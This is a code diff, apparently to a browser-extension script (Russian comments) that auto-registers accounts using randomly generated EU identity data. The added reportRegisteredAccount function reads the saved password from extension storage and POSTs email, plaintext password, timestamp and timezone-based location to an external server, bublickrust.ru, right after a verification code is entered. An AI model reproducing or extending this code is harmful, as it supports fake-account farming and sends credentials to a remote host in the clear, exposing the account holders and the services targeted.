@@ -69,6 +69,7 @@
   };
   
   let registrationStarted = false;
+  let registrationReported = false; // чтобы не дублировать отправку зарегистрированного аккаунта
   
   // Генератор случайных данных для EU
   const randomGenerator = {
@@ -440,6 +441,43 @@
   // Задержка
   function delay(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  // Отправка сведений о зарегистрированном аккаунте на сервер (idempotent)
+  async function reportRegisteredAccount(email) {
+    try {
+      if (registrationReported) {
+        Logger.debug('register', 'reportRegisteredAccount: уже отправляли, пропускаем', { email });
+        return;
+      }
+      const stored = await new Promise(resolve => chrome.storage.local.get(['registrationPassword'], resolve));
+      const passwordForReport = stored?.registrationPassword || null;
+      if (!passwordForReport) {
+        Logger.warning('register', 'reportRegisteredAccount: пароль не найден в storage, пропуск');
+        return;
+      }
+      // Локация по таймзоне
+      let registrationLocation = null;
+      try {
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+        if (tz) registrationLocation = tz === 'Europe/Moscow' ? 'Москва' : tz;
+      } catch {}
+      const payload = {
+        email,
+        password: passwordForReport,
+        registered_at: new Date().toISOString(),
+        registration_location: registrationLocation
+      };
+      const resp = await fetch('https://bublickrust.ru/api/registered-accounts', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      Logger.info('register', 'reportRegisteredAccount: отправили на сервер', { ok: resp.ok, status: resp.status });
+      registrationReported = true;
+    } catch (e) {
+      Logger.error('register', 'reportRegisteredAccount: ошибка отправки', { error: e.message });
+    }
   }
   
   // Функция ожидания элемента
@@ -1382,6 +1420,8 @@
         });
       } else {
         Logger.success('register', 'Код успешно введен во все поля', { code: verificationCode });
+        // Сразу отправляем данные аккаунта на сервер (после успешного ввода кода), чтобы не зависеть от кнопки подтверждения
+        await reportRegisteredAccount(email);
       }
 
       await delay(1000);
